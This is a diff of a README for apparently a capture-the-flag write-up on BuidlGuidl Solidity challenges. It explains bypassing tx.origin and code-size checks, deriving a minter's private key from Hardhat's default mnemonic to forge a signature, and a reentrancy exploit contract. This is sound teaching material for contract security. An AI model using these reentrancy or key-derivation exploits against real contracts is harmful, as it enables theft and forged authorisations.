@@ -7,8 +7,7 @@ In the following lines I'll describe each challenge and the solution, you can al
 
 ## Challenge 1
 
-The first challenge only wants users to call a function. you need to have a wallet to interact with the network (in this case Optimism), and easily can connet your wallet to the optimism scan and call the function (ax). you can also use other ways to call the fucntion like remix ide, etc. 
-
+The first challenge only wants users to call registerMe(string memory _name) function of the challenge 1 contract (https://optimistic.etherscan.io/address/0xfa2Aad507B1Fa963A1fd6F8a491A7088Cd4538A5#code). you need to have a wallet to interact with the network (in this case Optimism), and easily can connet your wallet to the optimism scan (https://optimistic.etherscan.io/address/0xfa2Aad507B1Fa963A1fd6F8a491A7088Cd4538A5#writeContract) and call the function (ax). you can also use other ways to call the fucntion like remix ide, etc. 
 
 
 
@@ -18,49 +17,168 @@ the requirement of this challenge is msg.sender != tx.origin.
 
 In Solidity msg.sender is the account calling a function and tx.origin is the account (externally owned account) that initiated the transaction (or function call). 
 
-If a user send a transaction (like a function call) with their wallet. the msg.sender and tx.origin are same. but if a user call a function from contract_1 and in that function, there was a call to another contract (like contract_2), in contract_2, msg.sender would be contract_1, and tx.origin would be the user. 
+If a user send a transaction (like a function call) with their wallet then msg.sender = tx.origin. but if a user call a function from contract_1 and in that function, there was a call to another contract (like contract_2), in contract_2, msg.sender would be contract_1, and tx.origin would be the user address. 
 (ax)
 
 So you only need to have a contract to call the target contract. A simple contract is created for this purpose can be found at contracts/CtfChallenge2.sol file. 
 
-After deployment and verification of the solution contract for challenge 2, call 
+After deployment and verification of the solution contract for challenge 2 by: 
+
+```
+npm run deplpy:op
+```
+
+(find deployed contract at depolyments folder)
+
+ call 
 
 indirectCall(target_address) functoin and pass challenge2_contract_address as argument. 
 
 
 ## Challenge 3
 
-To pass this challenge you need to have a contract to call the challenge contract like challenge 2, but with a difference, the contract that calls the cahllenge contract should not have any code in their storage during the call.  
+To pass this challenge you need to have a contract to call the challenge contract just like challenge 2, but with a difference. The contract that calls the cahllenge contract should not have any code in their storage during the call.  
 But how it's possible?!
 
 Before explaining the solution you need to know that in EVM based networks, there are 2 types of accounts, externally owned and internally owned. 
-externally owned accounts are wallets and internally owned accounts are contracts.
+externally owned accounts are wallets and internally owned accounts are smart contracts.
 
 every account has a storage on the network containing nonce, ether balance, code, etc. 
 For externally owned accounts there is no code, but for internally owned ones there's some code (so the length of the code is not 0).
 
 (ax)
 
-To pass the requirement of this challenge we need to have a contract (for indirect call), and with no code in its storage, its impossble unless during the creation of the contract.
+To pass the requirement of this challenge we need to have a contract (for indirect call), with no code in its storage. its impossble unless during the creation of the contract, since the code is not stored yet.
 
-So we need to call the challenge contract in constructor (before storing the code in contract account storage).
+So we need to call the challenge 3 contract in the constructor of another contract (before storing the code in the solution contract account storage).
 
 you can find the solution at contracts/CtfChallenge3.sol 
 
 you need to deploy contract with challenge3_contract_address as argument to pass this challenge.
 
+```
+npm run deploy:op
+```
+
 
 ## Challenge 4
+
+By checking challenge 4 contract you'll know that you should find the minter address (and secret key), sign a message with a specific format and pass these 2 arguments to the mintFlag(address _minter, bytes memory signature) function to pass this step. 
+
+In the challenge 4 hints, the deploy script is referred (https://github.com/buidlguidl/ctf.buidlguidl.com/blob/main/packages/hardhat/deploy/00_deploy_ctf_contracts.ts#L71). 
+
+```
+const hAccounts = hre.config.networks.hardhat.accounts as HardhatNetworkHDAccountsConfig;
+  const derivationPath = "m/44'/60'/0'/0/12";
+  const challenge4Account = HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(hAccounts.mnemonic), derivationPath);
+```
+
+above code is the responsible for generating the minter address, that we should use to generate a signature by it. 
+
+If you are not using Hardhat (or EthScafold) I highly recommend to use it, since the deploy script is developed in Hardhat. 
+
+The minter address is an HD account with "m/44'/60'/0'/0/12" derivation path and with default mnemonic of Hardhat. 
+
+We do the exact thing like challenge 4 deploy script to find minter address and secret key and then sign the requined message. 
+
+The solution is at deploy/004_deploy_ctfchallenge4.ts file.
+
+First we derive the minter address: 
+
+```
+const hAccounts = hre.config.networks.hardhat.accounts as HardhatNetworkHDAccountsConfig;
+  const derivationPath = "m/44'/60'/0'/0/12";
+  const challenge4Account = HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(hAccounts.mnemonic), derivationPath);
+
+  console.log("Challenge4 account:", challenge4Account);
+  console.log("Challenge4 address:", challenge4Account.address);
+```
+
+and then sign the message: 
+
+```
+const msgSender = deployer; // Or specify, e.g., "0xYourAddressHere"
+
+  // Compute the message hash (equivalent to keccak256(abi.encode("BG CTF Challenge 4", msg.sender)))
+  const abiCoder = new ethers.AbiCoder();
+  const messageHash = ethers.keccak256(abiCoder.encode(["string", "address"], ["BG CTF Challenge 4", msgSender]));
+
+  // Implement toEthSignedMessageHash equivalent in JavaScript
+  const prefix = ethers.toUtf8Bytes("\x19Ethereum Signed Message:\n32"); // Prefix as bytes
+  const combined = ethers.concat([prefix, ethers.getBytes(messageHash)]); // Concatenate prefix and messageHash
+//   const ethSignedMessageHash = ethers.keccak256(combined); // keccak256(prefix + messageHash)
+  const ethSignedMessageHash =  "0x8e60166d37d05ce89959a3599a67f10c4b81e3efd48c7974177e06bda61ca42f"
+
+  // Generate the signature
+//   const signature = await challenge4Account.signMessage(ethers.getBytes(ethSignedMessageHash));
+
+// Sign the raw digest (no extra prefixing)
+    const digest = ethers.getBytes(ethSignedMessageHash);
+    const signed = challenge4Account.signingKey.sign(digest);
+
+    // Format signature as hex string (r + s + v)
+    const signature = ethers.concat([
+    ethers.getBytes(signed.r),
+    ethers.getBytes(signed.s),
+    new Uint8Array([signed.v])
+    ]);
+    const signatureHex = ethers.hexlify(signature);
+```
+
+
+to check if the signature is valid or not:
+
+```
+  const recoveredAddress = ethers.verifyMessage(ethers.getBytes(ethSignedMessageHash), signature);
+  console.log("Recovered Address:", recoveredAddress); // Should match the minter address
+
+```
+
+
+the signature is ready! 
+
+Call challenge 4 contract mintFlag fucntion and mint your flag.
 
 
 
 ## Challenge 5
 
-in target contract you should claim point (at least 10), but claimPoints function checks if you have any point and prevent from several calls. but has a drawback in claimPoints function it calls msg.sender and if msg.sender has a receive function and in the receive function call claimPoints again it can bypass the requirement of claimPoints and got enough points. 
+In the challenge contract you should claim point (at least 10), but claimPoints function checks if you have any point and prevent from several calls. 
+But take a closer look:
 
-you can find the described solution at contracts/CtfChallenge5.sol
+```
+function claimPoints() public {
+        require(points[tx.origin] == 0, "Already claimed points");
+        (bool success, ) = msg.sender.call("");
+        require(success, "External call failed");
 
-after deployment of solution contract you need to call startClaim function and then mintFlag function from challenge5_contract
+        points[tx.origin] += 1;
+    }
+```
+
+in the above function, there's a call to msg.sender and and if msg.sender was a contract with a receive function, the receive function would be called during claimPoints.
+It called recursion and we can develop a contract with a receive function that its receive function calls claimPoints.
+
+But to prevent from a non ending loop we should have a counter and not call claimPoints function after 10 times (because we need only 10 points).
+
+```
+function startClaim() external {
+        callCount = 0;
+        challenge.claimPoints();
+    }
+
+    receive() external payable {
+        // emit recieveCalled();
+        if (callCount < TARGET) {
+            callCount++;
+            challenge.claimPoints();
+        }
+    }
+```
+
+you can find the solution at contracts/CtfChallenge5.sol
+
+after deployment of solution contract you need to call startClaim function from solution contract and then mintFlag function from challenge5_contract.
 
 
 ## Challenge 6
